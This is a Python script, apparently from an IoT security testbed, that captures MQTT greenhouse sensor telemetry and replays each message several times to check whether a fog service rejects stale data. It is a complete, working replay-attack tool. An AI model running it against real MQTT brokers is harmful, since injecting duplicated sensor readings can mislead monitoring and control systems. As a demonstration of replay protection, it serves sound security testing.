"""
Replay Attack Demonstration
Captures valid MQTT messages and replays them to demonstrate replay protection
"""

import asyncio
import json
import time
import logging
from datetime import datetime, timezone
from typing import Dict, Any, Optional, List
import paho.mqtt.client as mqtt
import argparse
import sys
import os

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("attack.replay")


class ReplayAttacker:
    """Demonstrates replay attacks against IoT sensors"""
    
    def __init__(self, mqtt_host: str = "mosquitto", mqtt_port: int = 1883):
        self.mqtt_host = mqtt_host
        self.mqtt_port = mqtt_port
        self.client: Optional[mqtt.Client] = None
        self.captured_messages: List[Dict[str, Any]] = []
        self.attack_log = []
        
        # Attack configuration
        self.capture_duration = 60  # seconds
        self.replay_delay = 300  # 5 minutes delay before replay
        self.replay_count = 5  # number of times to replay each message
        
    async def run_attack(self):
        """Execute the complete replay attack demonstration"""
        logger.info("Starting replay attack demonstration")
        
        try:
            # Phase 1: Capture legitimate messages
            await self.capture_phase()
            
            # Phase 2: Wait for replay delay
            await self.wait_phase()
            
            # Phase 3: Replay captured messages
            await self.replay_phase()
            
            # Phase 4: Generate report
            self.generate_report()
            
        except KeyboardInterrupt:
            logger.info("Attack demonstration interrupted by user")
        except Exception as e:
            logger.error(f"Attack demonstration failed: {e}")
        finally:
            self.cleanup()
    
    async def capture_phase(self):
        """Capture legitimate MQTT messages"""
        logger.info(f"Phase 1: Capturing messages for {self.capture_duration} seconds")
        
        # Setup MQTT client for capture
        self.client = mqtt.Client("replay-attacker-capture")
        self.client.on_connect = self._on_connect_capture
        self.client.on_message = self._on_message_capture
        
        # Connect and subscribe
        self.client.connect(self.mqtt_host, self.mqtt_port, 60)
        self.client.loop_start()
        
        # Capture for specified duration
        start_time = time.time()
        while time.time() - start_time < self.capture_duration:
            await asyncio.sleep(1)
        
        self.client.loop_stop()
        self.client.disconnect()
        
        logger.info(f"Captured {len(self.captured_messages)} messages")
        
        # Log captured messages
        for i, msg in enumerate(self.captured_messages):
            logger.info(f"Captured message {i+1}: {msg['sensor_id']} - {msg['timestamp']}")
    
    async def wait_phase(self):
        """Wait for replay delay to make messages stale"""
        logger.info(f"Phase 2: Waiting {self.replay_delay} seconds to make messages stale")
        
        # In a real attack, this would be much longer
        # For demo purposes, we'll simulate the delay
        if self.replay_delay > 60:
            logger.info("Simulating long delay (for demo purposes, using shorter wait)")
            await asyncio.sleep(10)  # Shorter delay for demo
        else:
            await asyncio.sleep(self.replay_delay)
    
    async def replay_phase(self):
        """Replay captured messages as attacks"""
        logger.info(f"Phase 3: Replaying {len(self.captured_messages)} messages")
        
        if not self.captured_messages:
            logger.warning("No messages captured, skipping replay phase")
            return
        
        # Setup MQTT client for replay
        self.client = mqtt.Client("replay-attacker-replay")
        self.client.on_connect = self._on_connect_replay
        self.client.on_publish = self._on_publish_replay
        
        # Connect
        self.client.connect(self.mqtt_host, self.mqtt_port, 60)
        self.client.loop_start()
        
        # Replay each captured message multiple times
        for i, message in enumerate(self.captured_messages):
            logger.info(f"Replaying message {i+1}/{len(self.captured_messages)}")
            
            for replay_num in range(self.replay_count):
                # Create attack log entry
                attack_entry = {
                    'attack_type': 'replay',
                    'original_timestamp': message['timestamp'],
                    'replay_timestamp': datetime.now(timezone.utc).isoformat(),
                    'sensor_id': message['sensor_id'],
                    'replay_number': replay_num + 1,
                    'message': message['payload']
                }
                
                # Replay the message
                topic = f"greenhouse/{message['sensor_id']}/telemetry"
                result = self.client.publish(topic, json.dumps(message['payload']), qos=1)
                
                # Log attack attempt
                if result.rc == mqtt.MQTT_ERR_SUCCESS:
                    attack_entry['status'] = 'sent'
                    logger.info(f"Replayed message from {message['sensor_id']} (attempt {replay_num + 1})")
                else:
                    attack_entry['status'] = 'failed'
                    logger.error(f"Failed to replay message: {result.rc}")
                
                self.attack_log.append(attack_entry)
                
                # Small delay between replays
                await asyncio.sleep(1)
            
            # Delay between different messages
            await asyncio.sleep(2)
        
        self.client.loop_stop()
        self.client.disconnect()
        
        logger.info(f"Replay phase completed. Sent {len(self.attack_log)} attack messages")
    
    def generate_report(self):
        """Generate attack report"""
        logger.info("Phase 4: Generating attack report")
        
        # Create logs directory
        os.makedirs("logs/attacks", exist_ok=True)
        
        # Generate detailed report
        report = {
            'attack_type': 'replay_attack',
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'summary': {
                'messages_captured': len(self.captured_messages),
                'replay_attempts': len(self.attack_log),
                'successful_sends': len([a for a in self.attack_log if a['status'] == 'sent']),
                'failed_sends': len([a for a in self.attack_log if a['status'] == 'failed'])
            },
            'configuration': {
                'capture_duration_seconds': self.capture_duration,
                'replay_delay_seconds': self.replay_delay,
                'replay_count_per_message': self.replay_count,
                'mqtt_broker': f"{self.mqtt_host}:{self.mqtt_port}"
            },
            'captured_messages': self.captured_messages,
            'attack_log': self.attack_log
        }
        
        # Save report to file
        report_file = f"logs/attacks/replay_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Attack report saved to {report_file}")
        
        # Print summary
        print("\n" + "="*60)
        print("REPLAY ATTACK DEMONSTRATION RESULTS")
        print("="*60)
        print(f"Messages Captured: {report['summary']['messages_captured']}")
        print(f"Replay Attempts: {report['summary']['replay_attempts']}")
        print(f"Successful Sends: {report['summary']['successful_sends']}")
        print(f"Failed Sends: {report['summary']['failed_sends']}")
        print(f"Report File: {report_file}")
        print("\nExpected Behavior:")
        print("- With security enabled: Fog should reject replayed messages")
        print("- Without security: Replayed messages will be accepted")
        print("- Check fog service logs for rejection messages")
        print("="*60)
    
    def _on_connect_capture(self, client, userdata, flags, rc):
        """Callback for capture phase connection"""
        if rc == 0:
            logger.info("Connected to MQTT broker for message capture")
            # Subscribe to all sensor telemetry
            client.subscribe("greenhouse/+/telemetry", qos=1)
        else:
            logger.error(f"Failed to connect to MQTT broker: {rc}")
    
    def _on_message_capture(self, client, userdata, msg):
        """Callback for capturing messages"""
        try:
            topic_parts = msg.topic.split('/')
            if len(topic_parts) == 3 and topic_parts[2] == 'telemetry':
                sensor_id = topic_parts[1]
                payload = json.loads(msg.payload.decode())
                
                captured_message = {
                    'sensor_id': sensor_id,
                    'topic': msg.topic,
                    'timestamp': datetime.now(timezone.utc).isoformat(),
                    'payload': payload
                }
                
                self.captured_messages.append(captured_message)
                logger.debug(f"Captured message from {sensor_id}")
                
        except Exception as e:
            logger.error(f"Error capturing message: {e}")
    
    def _on_connect_replay(self, client, userdata, flags, rc):
        """Callback for replay phase connection"""
        if rc == 0:
            logger.info("Connected to MQTT broker for message replay")
        else:
            logger.error(f"Failed to connect to MQTT broker for replay: {rc}")
    
    def _on_publish_replay(self, client, userdata, mid):
        """Callback for published replay messages"""
        logger.debug(f"Replay message {mid} published")
    
    def cleanup(self):
        """Cleanup resources"""
        if self.client:
            try:
                self.client.loop_stop()
                self.client.disconnect()
            except:
                pass


async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Replay Attack Demonstration")
    parser.add_argument("--mqtt-host", default="mosquitto", help="MQTT broker host")
    parser.add_argument("--mqtt-port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--capture-duration", type=int, default=60, help="Message capture duration in seconds")
    parser.add_argument("--replay-delay", type=int, default=10, help="Delay before replay in seconds")
    parser.add_argument("--replay-count", type=int, default=5, help="Number of times to replay each message")
    
    args = parser.parse_args()
    
    # Create attacker
    attacker = ReplayAttacker(args.mqtt_host, args.mqtt_port)
    attacker.capture_duration = args.capture_duration
    attacker.replay_delay = args.replay_delay
    attacker.replay_count = args.replay_count
    
    # Run attack
    await attacker.run_attack()


if __name__ == "__main__":
    asyncio.run(main())